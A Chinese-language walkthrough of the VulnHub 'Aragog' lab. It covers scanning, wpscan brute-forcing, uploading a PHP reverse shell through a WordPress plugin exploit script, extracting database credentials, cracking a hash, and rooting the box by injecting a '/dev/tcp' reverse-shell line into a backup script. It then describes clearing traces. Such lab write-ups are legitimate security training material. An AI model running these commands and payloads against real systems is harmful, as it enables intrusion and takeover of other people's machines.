# 前言

使用`virtual box`虚拟机

靶机：`Aragog : 192.168.1.101` 

攻击：`kali  : 192.168.1.16`

# 主机发现

使用`arp-scan -l`扫描，在同一虚拟网卡下

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\1.jpg)

# 信息收集

## 使用`nmap`扫描

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\2.jpg)

发现22端口`SSH`服务，`openssh`

80端口`HTTP`服务，`Apache 2.4.38`

系统为`Linux 4.x|5.x`

## 对于80端口进一步收集信息

### 访问80端口查看

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\3.jpg)

一张海报，下载查看有无隐藏信息，也不知到密码，所以直接回车，发现没有信息

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\4.jpg)



### 扫描网站目录

使用`dirsearch、gobuster、dirb、dirbuster、ffuf`等工具都可以

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\5.jpg)

使用`whatweb`进行探测，结合前面的`wp-login.php`，确定是`wordpress`的`CMS`

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\6.jpg)

使用`wpscan`专门针对`wordpress`的工具进行探测，发现有`xmlrpc.php`文件，说明可能存在用户枚举等，直接再使用该工具进行枚举

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\7.jpg)



```shell
wpscan --url http://192.168.1.101 -e u -P /usr/share/wordlists/rockyou.txt
```

这个是把从`wordpress`中枚举的用户，使用密码字典进行对用户的爆破

使用这个命令破解需要时间，可以先访问`wp-admin`界面查看，发现有问题，这里访问的是域名了

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\8.jpg)

修改`/etc/hosts`文件，把域名与`ip`绑定一起

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\9.jpg)



再次访问`wp-admin`，成功访问

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\10.jpg)

那么前面在进行密码破解时，可能就有问题了，因为之前没有进行域名绑定，并且这里是通过域名进行直接访问的，IP访问是进行的跳转，所以，对于密码爆破，重新进行

把`url`地址改为域名`wordpress.aragog.hogwarts`即可，其余不用变动

```shell
wpscan --url http://word.press.aragog.hogwarts -e u -P 【字典路径】
```



这次出的东西就增加许多，这里指出一个使用主题，版本过低

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\11.jpg)



但是因为是密码爆破，所以时间还是长，让他在那继续爆破，继续寻找其他地方。这里经过漫长的时间，一直没有成功，所以可能这里并不存在

寻找其他方法，尝试枚举插件`plugins`和主题`theme`等，检测模式等需要改成主动的，具有侵略性的，不然可能会忽略掉一些，上面大部分还是`passive`被动收集的

# 漏洞寻找及利用

```shell
wpscan --url http://wordpress.aragog.hogwarts/blog -e ap --detection-mode aggressie --plugins-detection-mode aggressive
```

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\12.jpg)

有提示，说是版本的问题，这里有的可能不准确，所以还是需要自己去认证，这里直接搜索，看有无该漏洞，可以使用`searchsploit`或者`msf`都可以

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\13.jpg)



直接定位该文件的位置`locate`，然后复制到当前目录并重命名，方便使用

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\14.jpg)

可以查看该脚本文件，里面有用法

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\15.jpg)

在使用该脚本时，会有提示，需要先安装`jq`的，直接使用`apt`安装即可。检测到是有漏洞的，开始下一步

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\16.jpg)

首先这里确定是`php`脚本语言的，然后这里使用`kali`自带的一个`webshell`，路径在`/usr/share/webshell/php/php-reverse-shell.php`文件，修改其中的监听IP和端口即可

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\17.jpg)

执行`file.sh`脚本中的用法，进行上传

```shell
bash file.sh -u http://wordpress.aragog.hogwarts/blog -f /usr/share/webshells/php/php-reverse-shell.php --verbose
```



![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\18.jpg)



可以看到这里的提示，和用法中的一样，表示上传成功，使用`kali`开启监听`1234`端口，然后浏览器进行访问，可以发现成功反弹`shell`

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\19.jpg)



开始寻找文件，这里可以自己尝试获取交互式界面，我这里就不操作了，可以测试`python`或者`bash`和`sh`等

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\20.jpg)

# 提权

## 寻找wordpress目录

这里解密后说是"谁的日记被哈里在哪里秘密的摧毁了"，则，没有用处，发现在平常的`/var/www/html`目录下，并不存在`wordpress`的目录，使用`find`寻找，可以看到这里的有`wp`的一些常见目录，去目录下查看

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\21.jpg)

找对目录了

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\22.jpg)



查看配置文件`wp-config.php`

一直指向一个目录下的文件，等下去查看

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\23.jpg)

这里还提供的连接数据库的库名和用户名，但是没有直接给出密码

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\24.jpg)



切换`/etc/wordpress`目录，并查看

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\25.jpg)

这里有了连接数据库的具体信息，查看端口信息

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\26.jpg)

## 连接数据库

使用命令连接数据库

```shell
mysql -h localhost -P 3306 -uroot -pmySecr3tPass
```

查看数据库中的信息

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\27.jpg)

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\28.jpg)

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\29.jpg)



可以发现这里的用户`hagrid98`在网站`wordpress`中的显示就是`WP-Admin`，解密这个密码即可，如果有加盐`salt`等时，再搜索一遍，看能否找到加密算法等，这里直接可以通过`md5`解密，但是竟然要收费，这不行啊。

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\30.jpg)



换了一个网站进行解密`https://www.somd5.com/`

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\31.jpg)

## 登录hagrid98

这里就获取用户`hagrid98`的密码，使用`ssh`连接

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\32.jpg)

使用`find / -perm -u=s -type f 2>/dev/null`未发现有可利用的命令进行提取

使用`find`寻找可能的一些文件，如`*pass*`、`*user*`、`*back*`等

找到一个隐藏的备份，这要看看

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\33.jpg)

发现该文件具有可读可写可执行，对于用户`hagrid98`，执行测试发现是复制

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\34.jpg)



再查看具体的代码，

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\35.jpg)



`cp`参数:

-r 或 --recursive：用于复制目录及其所有的子目录和文件，如果要复制目录，需要使用该选项。

很明显，就是备份文件到临时目录中，这个备份应该会执行，至于是手工还是定时，不得而知，不过可以在这个代码中进行插入，使得可以获得`root`的`shell`。插入下面命令

```shell
bash -i >& /dev/tcp/192.168.1.16/8888 0>&1
```

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\36.jpg)

## 登录root

然后在`kali`中开启监听`8888`端口，即可发现反弹成功

![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\37.jpg)







# 清除痕迹



![](D:\stu\vulnhub\harrypotter靶场\pic-aragog\38.jpg)

![39](D:\stu\vulnhub\harrypotter靶场\pic-aragog\39.jpg)

![40](D:\stu\vulnhub\harrypotter靶场\pic-aragog\40.jpg)





# 总结

1. 对于网站目录的识别，常见的`CMS`要大概清楚
2. 使用`wpscan`针对扫描`wordpress`时，可以扫描主题插件等
3. 对于`searchsploit`的利用，要会复现
4. 善用`find`命令可以使得步骤等非一般的提升
5. 对于文件，要学会找到一些可能存在的，比如这里的指向，是指向`/etc/wordpress`目录的，如果文件没看清的话，就会导致寻找不到提权点
6. 对于常见的数据库使用的加密方式可以简单了解
7. 找不到具有`SUID`权限的文件时，可以寻找可能具有关键字的一些文件，常见的密码、用户名以及备份文件等
8. 常见的提权`bash`指令，要知道为什么可以提权





































